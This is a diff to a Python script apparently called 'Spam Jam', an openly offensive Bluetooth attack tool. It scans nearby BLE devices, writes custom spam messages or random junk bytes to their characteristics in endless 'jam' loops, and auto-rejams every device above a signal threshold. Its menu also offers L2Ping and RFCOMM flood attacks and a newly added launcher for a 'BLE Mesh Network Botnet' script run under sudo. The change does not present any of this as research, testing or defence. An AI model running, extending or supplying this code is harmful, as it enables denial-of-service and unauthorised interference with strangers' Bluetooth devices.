@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import sys
 import time
@@ -14,13 +15,10 @@ def print_banner():
 ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██   ██║██╔══██║██║╚██╔╝██║
 ███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║
 ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ 
-   ❤️💜 A WORLD OF BLE FUN 💜❤️
-   👩‍💻 Author: ekoms savior
-   🎯 Now with BLE Advertise ALL !! 🎉
-   """)
-    print("💜 XOXO HACK THE PLANET! 💜\n")
+💜 Spam Jam – Now with BLE Mesh Network Botnet by ekoms savior 💜
+""")
 
-# 🎯 BLE Spamming Class
+# 🎯 BLE Spam Class
 class BLESpam(DefaultDelegate):
     def __init__(self):
         DefaultDelegate.__init__(self)
@@ -51,7 +49,7 @@ def flipper_ble_advertise_all():
         print("\n🛑 BLE Advertise All stopped. Restoring name...")
         subprocess.run(["bluetoothctl", "system-alias", "SpamJam"], stdout=subprocess.DEVNULL)
 
-# 🔎 Interactive BLE Scanner
+# 🔎 BLE Scanner
 def interactive_ble_scan():
     print("🔎 Scanning for BLE devices nearby...")
     scanner = Scanner()
@@ -67,32 +65,26 @@ def interactive_ble_scan():
         print(f"⚠️ Scan failed: {e}")
         return []
 
-# 🚀 Spam Single BLE Device
+# 💌 Spam Single BLE Device
 def spam_ble():
     devices = interactive_ble_scan()
     if not devices:
         return
     try:
-        idx = int(input("💜 Enter index of device to spam: "))
+        idx = int(input("💜 Index to spam: "))
         target_mac = devices[idx].addr
     except (ValueError, IndexError):
         print("⚠️ Invalid index.")
         return
-
-    print(f"🚀 Spamming device {target_mac} 💥💜")
-    custom_message = input("💜 Enter your custom spam message: ").encode()
-
+    custom_message = input("💜 Your spam message: ").encode()
     try:
-        print("🔎 Attempting connection with RANDOM address type...")
         peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
     except BTLEException:
-        print("⚠️ RANDOM address type failed! Trying PUBLIC address type...")
         try:
             peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
         except BTLEException as e:
-            print(f"❌ Failed to connect to {target_mac}. Error: {e}")
+            print(f"❌ Failed: {e}")
             return
-
     peripheral.setDelegate(BLESpam())
     while True:
         try:
@@ -103,111 +95,79 @@ def spam_ble():
             print(f"⚠️ Error: {e}")
             break
 
-# 🚀 Spam All BLE Devices
+# 💌 Spam All BLE Devices
 def spam_all_ble():
     devices = interactive_ble_scan()
     if not devices:
         return
-    custom_message = input("💜 Enter your spam message for all devices: ").encode()
+    custom_message = input("💜 Message for all: ").encode()
     for device in devices:
         try:
-            print(f"🚀 Trying to spam {device.addr} 💌")
+            print(f"🚀 Spamming {device.addr}")
             peripheral = Peripheral(device.addr, ADDR_TYPE_RANDOM)
             peripheral.setDelegate(BLESpam())
             peripheral.writeCharacteristic(0x0001, custom_message)
-            print(f"💜 Spammed {device.addr}")
+            print(f"💜 Sent to {device.addr}")
             peripheral.disconnect()
         except Exception as e:
-            print(f"⚠️ Could not spam {device.addr}: {e}")
+            print(f"⚠️ {device.addr} skipped: {e}")
 
-# 🚫 Jam Single BLE Device
+# 🚫 Jam Single
 def jam_ble():
-    print("🔎 Resetting BLE scan before jamming...")
-    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL)
     scanner = Scanner()
     try:
         devices = list(scanner.scan(15.0))
     except BTLEException as e:
         print(f"⚠️ BLE Scan Failed: {e}")
         return
-    if not devices:
-        print("⚠️ No devices found!")
-        return
     for idx, device in enumerate(devices):
-        print(f"🔹 {idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")
+        print(f"🔹 {idx}: {device.addr} RSSI={device.rssi} dB")
     try:
-        idx = int(input("💜 Enter index of device to jam: "))
+        idx = int(input("💜 Index to jam: "))
         target = devices[idx].addr
-    except (ValueError, IndexError):
+    except:
         print("⚠️ Invalid choice.")
         return
-    print(f"💥 Jamming {target} 🚫")
     try:
         peripheral = Peripheral(target)
         while True:
             junk = os.urandom(random.randint(20, 50))
             peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
             print(f"🚫 Jammed {target}")
-            time.sleep(random.uniform(0.05, 0.2))
+            time.sleep(0.1)
     except Exception as e:
-        print(f"⚠️ Error: {e}")
-        if input("💜 Try another? (y/n): ").strip().lower() == 'y':
-            jam_ble()
+        print(f"⚠️ {e}")
 
-# 🚫 Jam All BLE Devices
+# 🚫 Jam All
 def jam_all_ble():
-    print("🔎 Starting auto-rejam loop 📡")
     try:
-        min_rssi = int(input("💜 Enter minimum RSSI to jam (e.g. -80): "))
-    except ValueError:
+        min_rssi = int(input("💜 RSSI threshold (e.g. -80): "))
+    except:
         min_rssi = -80
-        print("⚠️ Invalid input. Using default -80 dB.")
     try:
         while True:
-            print("\n🔁 Scanning for BLE devices to jam...")
             scanner = Scanner()
-            try:
-                devices = list(scanner.scan(15.0))
-            except BTLEException as e:
-                print(f"⚠️ BLE Scan failed: {e}")
-                continue
-            for dev in devices:
-                print(f"  • {dev.addr} RSSI={dev.rssi} dB")
-            jam_targets = [dev for dev in devices if dev.rssi >= min_rssi]
-            if not jam_targets:
-                print("⚠️ No targets above threshold.")
-            for device in jam_targets:
-                try:
-                    print(f"💥 Jamming {device.addr} (RSSI={device.rssi} dB)")
-                    peripheral = Peripheral(device.addr)
-                    junk = os.urandom(random.randint(20, 50))
-                    peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
-                    peripheral.disconnect()
-                    time.sleep(random.uniform(0.05, 0.2))
-                except Exception as e:
-                    print(f"⚠️ Skipped {device.addr}: {e}")
-            print("🔁 Waiting 5 seconds...")
+            devices = list(scanner.scan(15.0))
+            for device in devices:
+                if device.rssi >= min_rssi:
+                    try:
+                        print(f"💥 Jamming {device.addr}")
+                        peripheral = Peripheral(device.addr)
+                        junk = os.urandom(random.randint(20, 50))
+                        peripheral.writeCharacteristic(0x000b, junk, withResponse=False)
+                        peripheral.disconnect()
+                        time.sleep(0.2)
+                    except Exception:
+                        pass
             time.sleep(5)
-            print("🔍 Also scanning for classic devices...")
-            subprocess.run(["hcitool", "scan"])
     except KeyboardInterrupt:
-        print("\n🛑 Stopped by user.")
+        print("🛑 Jam stopped.")
 
-# Bluetooth Scanner
-def scan_bluetooth():
-    print("🔎 Scanning for Bluetooth devices...")
-    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    try:
-        scanner = Scanner()
-        devices = list(scanner.scan(10.0))
-        if not devices:
-            print("⚠️ No Bluetooth devices found.")
-            return
-        for idx, d in enumerate(devices):
-            print(f"🔹 {idx}: {d.addr} ({d.addrType}), RSSI={d.rssi} dB")
-    except BTLEException as e:
-        print(f"⚠️ Scan failed: {e}")
-
+# 🧠 Start Bluetooth
+def start_bluetooth():
+    print("📡 Starting Bluetooth...")
+    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
 # 💥 L2Ping
 def l2ping_attack():
     devices = interactive_ble_scan()
@@ -248,13 +208,15 @@ def rfcomm_flood():
         except subprocess.CalledProcessError:
             print(f"⚠️ Attempt {i+1}: Failed")
 
-# 🧠 Start Bluetooth
-def start_bluetooth():
-    print("📡 Starting Bluetooth service...")
-    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
-    print("✅ Bluetooth service started!")
 
-# 🏁 Main Menu
+# 🌐 Mesh Botnet Menu Launcher
+def launch_mesh_botnet_menu():
+    print("🌐 Launching Mesh Menu...\n")
+    try:
+        subprocess.run(["sudo", "python3", "spamjam_mesh.py"])
+    except Exception as e:
+        print(f"⚠️ Failed to launch mesh menu: {e}")
+
 def main():
     print_banner()
     while True:
@@ -265,21 +227,36 @@ def main():
         print("🔹 4 Spam All BLE Devices 💌💥")
         print("🔹 5 Jam a BLE device 🚫")
         print("🔹 6 Jam All BLE Devices 🚫💥")
-        print("🔹 7 L2Ping Attack 💥")
-        print("🔹 8 RFCOMM Flood 💥")
-        print("🔹 9 Quit 🚪")
+        print("🔹 7 Mesh Network Menu 🌐")
+        print("🔹 8 L2Ping Attack 💥")
+        print("🔹 9 RFCOMM Flood 💥")
+        print("🔹 10 Quit 🚪")
 
-        choice = input("💜 Choose an option (0-9): ").strip()
-        functions = [flipper_ble_advertise_all, start_bluetooth, scan_bluetooth, spam_ble,
-                     spam_all_ble, jam_ble, jam_all_ble, l2ping_attack, rfcomm_flood]
+        choice = input("💜 Choose an option (0-10): ").strip()
+        functions = [
+            flipper_ble_advertise_all, start_bluetooth, scan_bluetooth, spam_ble,
+            spam_all_ble, jam_ble, jam_all_ble, launch_mesh_botnet_menu,
+            l2ping_attack, rfcomm_flood
+        ]
 
-        if choice == "9":
+        if choice == "10":
             print("👋 Goodbye, fren! XOXOXO 💜")
             sys.exit()
-        elif choice in map(str, range(0, 9)):
+        elif choice in map(str, range(0, 10)):
             functions[int(choice)]()
         else:
             print("⚠️ Invalid choice. Try again! 💜")
+
+def scan_bluetooth():
+    print("🔎 Scanning for Bluetooth...")
+    subprocess.run(["hciconfig", "hci0", "reset"], stdout=subprocess.DEVNULL)
+    scanner = Scanner()
+    try:
+        devices = list(scanner.scan(10.0))
+        for idx, d in enumerate(devices):
+            print(f"🔹 {idx}: {d.addr} RSSI={d.rssi} dB")
+    except BTLEException as e:
+        print(f"⚠️ Scan failed: {e}")
 
 if __name__ == "__main__":
     main()
